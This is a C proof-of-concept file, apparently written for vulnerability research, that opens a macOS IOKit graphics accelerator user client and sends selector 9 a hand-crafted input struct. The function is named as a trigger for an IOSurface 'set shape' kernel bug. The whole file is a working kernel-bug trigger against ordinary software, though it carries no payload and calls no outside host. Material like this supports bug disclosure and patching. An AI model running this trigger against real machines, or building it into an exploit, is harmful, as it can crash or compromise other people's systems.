// clang -o poc main.cpp -framework CoreFoundation -framework IOKit -g -D_FORTIFY_SOURCE=0

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <Kernel/libkern/sysctl.h>
#include <IOKit/IOKitLib.h>
#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>       /* basic system data types */
#include <sys/socket.h>      /* basic socket definitions */
#include <netinet/in.h>      /* sockaddr_in{} and other Internet defns */
#include <arpa/inet.h>       /* inet(3) functions */
#include <netdb.h> /*gethostbyname function */
#include <sys/types.h>
#include <sys/quota.h>



io_connect_t open_and_connect_user_client(char* service_name, int type) {
    kern_return_t err;
    io_connect_t conn = MACH_PORT_NULL;
    
    CFMutableDictionaryRef matching = IOServiceMatching("IOGraphicsAccelerator2");
    if(!matching){
        printf("unable to create service matching dictionary\n");
        return conn;
    }
    
    io_iterator_t iterator;
    err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
    if (err != KERN_SUCCESS){
        printf("no matches\n");
        return conn;
    }
    
    io_service_t service = IOIteratorNext(iterator);
    
    if (service == IO_OBJECT_NULL){
        printf("unable to find service\n");
        return conn;
    }
    printf("got service: %x\n", service);
    
    
    err = IOServiceOpen(service, mach_task_self(), type, &conn);
    if (err != KERN_SUCCESS){
        printf("unable to get user client connection\n");
        return MACH_PORT_NULL;
    }
    //getchar();
    printf("got userclient connection: %x\n", conn);
    return conn;
}

void test_io_connect_method(io_connect_t conn, int selector, uint64_t* scalar_input,
                            uint32_t scalar_input_cnt,
                            unsigned char* struct_input, size_t struct_input_cnt, int scalar_output_cnt,
                            int struct_output_cnt) {

    uint64_t outputScalar[16];
    uint32_t outputScalarCnt = scalar_output_cnt;
    
    char outputStruct[4096];
    size_t outputStructCnt = struct_output_cnt;
    
    int index = selector;
    printf("IOConnectCall (selector = %d)\n", index);
    //getchar();
    kern_return_t err = IOConnectCallMethod(
                                            conn,
                                            index,
                                            scalar_input,
                                            scalar_input_cnt,
                                            struct_input,
                                            struct_input_cnt,
                                            outputScalar,
                                            &outputScalarCnt,
                                            outputStruct,
                                            &outputStructCnt);
    
    if (err != KERN_SUCCESS){
        printf("IOConnectCall (%d) error: %x\n", index, err);
    }
}

void trigger_iosurface_set_shape() {
    io_connect_t conn = open_and_connect_user_client("IOAccelerator", 0);
    uint64_t inputScalar[16] = {0};
    uint32_t inputScalarCnt = 0;
    
    unsigned char inputStruct[20] = {0x01, 0x00, 0x00, 0x00,
                              0x3c, 0x00, 0xe0, 0x05,
                              0x94, 0x01, 0x60, 0x00,
                              0xde, 0x00, 0xe4, 0x05,
                              0x63, 0xa5, 0x4c, 0x00};
    size_t inputStructCnt = 0;
    
    inputScalarCnt = 2;
    char* input_char = (char*)inputScalar;
    input_char[0] = 0x05;
    input_char[1] = 0x30;
    
    inputStructCnt = 20;
    
    
    test_io_connect_method(conn, 9, inputScalar, inputScalarCnt, inputStruct, inputStructCnt, 0, 0);

}

int main(int argc, const char * argv[]) {
    trigger_iosurface_set_shape();
    return 0;
}





